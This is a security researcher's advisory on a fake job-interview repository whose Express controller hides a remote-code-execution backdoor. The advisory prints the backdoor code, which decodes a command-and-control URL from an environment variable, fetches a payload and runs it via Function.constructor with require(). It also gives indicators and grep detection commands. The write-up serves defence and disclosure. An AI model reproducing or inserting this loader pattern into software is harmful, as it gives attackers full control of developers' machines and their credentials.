# Runtime RCE Backdoor Hidden in an Environment Variable (Optu-Consulting/Real-Estate-Booking)

**Author:** Trygve Bundgaard — independent security researcher (GitHub: [@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))
**Discovered:** 2026-01-29
**Status:** Malware identified before execution during pre-run review of a repository delivered as an interview "test". The GitHub account and repository now return 404 (checked 2026-10-08).
**Severity:** Critical — remote code execution with full Node.js `require()` access
**Type:** Social-engineering / fake-interview malware ("Contagious Interview" pattern)

> Indicators below are the code pattern itself. The C2 URL lives in an env var whose value was never supplied or recorded, so the URL is unknown and there is nothing to defang.

> **Name note:** a legitimate company, Optu Consulting, LLC, exists. Nothing here suggests it is involved; these operators routinely borrow real company names. "Optu-Consulting" below refers only to the GitHub account that delivered the repo.

## Summary

A repository sent as a "Real Estate Booking" interview task contained the same
`Function.constructor('require', …)` remote-code-execution backdoor seen in the
earlier [W3GLFun case](2026-01-27-contagious-interview-w3glfun-rce.md) — but
with a new wrinkle: the command-and-control URL is **hidden in an environment
variable** instead of sitting inline, and the backdoor lives in an application
**controller** (`getCookie`). This is the same attack class with better concealment.

## Technical analysis

```javascript
// server/controllers/userCntrl.js (around line 139)
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const src = atob(process.env.DEV_API_KEY),            // base64 C2 URL from an env var
        x_secret_key = "x-secret-key",
        _sign = "_",
        SessionContent = (await axios.get(src, { headers: { [x_secret_key]: _sign } })).data.cookie,
        handler = new (Function.constructor)('require', SessionContent); // compile remote code
  handler(require);                                      // execute with require() in scope
})();                                                    // ← invoked immediately
```

| Element | Purpose |
|---------|---------|
| `atob(process.env.DEV_API_KEY)` | Decodes a base64 C2 URL **hidden in an env var** (no URL in the source) |
| `axios.get(src, { headers: { "x-secret-key": "_" } })` | Fetches the payload with a custom header, likely a gate so casual requests get nothing (not verified; the host was never contacted) |
| `.data.cookie` | Uses the response body as executable code |
| `new (Function.constructor)('require', SessionContent)` | Compiles attacker-controlled text into a function with `require` |
| `handler(require)` | Runs it with full Node.js — filesystem, env, network |
| `})();` | Runs the payload as soon as the controller is `require()`d at server start. `exports.getCookie` then holds the call's return value, not a usable route handler |

### Why the env-var trick matters

A reviewer grepping for `Buffer.from(…, "base64")` or a hardcoded `http` URL
finds nothing — the destination only exists at runtime once `DEV_API_KEY` is
set, and the payload server likely ignores requests that lack the
`x-secret-key: _` header. Static review that stops at `package.json` scripts
(here the only `postinstall` is a benign `prisma generate`) will miss it
entirely; the backdoor is in the app's controller code.

Not determined: the `DEV_API_KEY` value and how a victim would receive it, and
the local `../config/axiosConfig` module that supplies `axios` (never inspected).

## Indicators of compromise

| Indicator | Value |
|-----------|-------|
| Repository | `github[.]com/Optu-Consulting/Real-Estate-Booking` (404 as of 2026-10-08) |
| File | `server/controllers/userCntrl.js`, export `getCookie` |
| Code pattern | `new (Function.constructor)('require', <remote>)` fed from `axios.get(atob(process.env.<VAR>))` |
| Env-var C2 | base64 URL stored in an env var (observed: `DEV_API_KEY`) |
| Fetch header | `x-secret-key: _` sent with the payload request (likely a gate) |
| Benign script | the only `postinstall` is a standard `prisma generate` |

## Impact

RCE with `require()` on the developer's machine — read/write any file, run any
command, steal `.env` secrets, wallet keys, SSH keys, and credentials. Triggers
as soon as the server loads the controller.

## Detection

```bash
# the execution primitive, regardless of where the URL comes from
grep -rn "Function.constructor" --include=*.js --include=*.ts --include=*.cjs .
# remote fetch whose URL is decoded from an env var
grep -rn "atob(process.env\|Buffer.from(process.env" --include=*.js --include=*.ts .
# a fetch feeding code straight into execution
grep -rn "axios.get\|fetch(" -A3 --include=*.js --include=*.ts . | grep -n "Function.constructor"
```

## Safe handling

- **Review controllers/route handlers, not just `package.json` scripts** — this family is moving the payload into app code.
- Treat `Function.constructor` / `new Function(...)` fed by any network value as RCE until proven otherwise.
- Analyze untrusted repos in a disposable sandbox with no secrets present and networking off.
- If you already installed/ran it on your host, rotate every credential that machine could reach.

## Campaign context

Same execution technique and fake-interview lure as the W3GLFun case,
re-obfuscated — consistent with the "Contagious Interview" activity targeting
developers. Documented here to show the **env-var** variant so reviewers don't
rely on finding a hardcoded URL.

---

*Published for the protection of the developer community. — Trygve Bundgaard ([@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))*
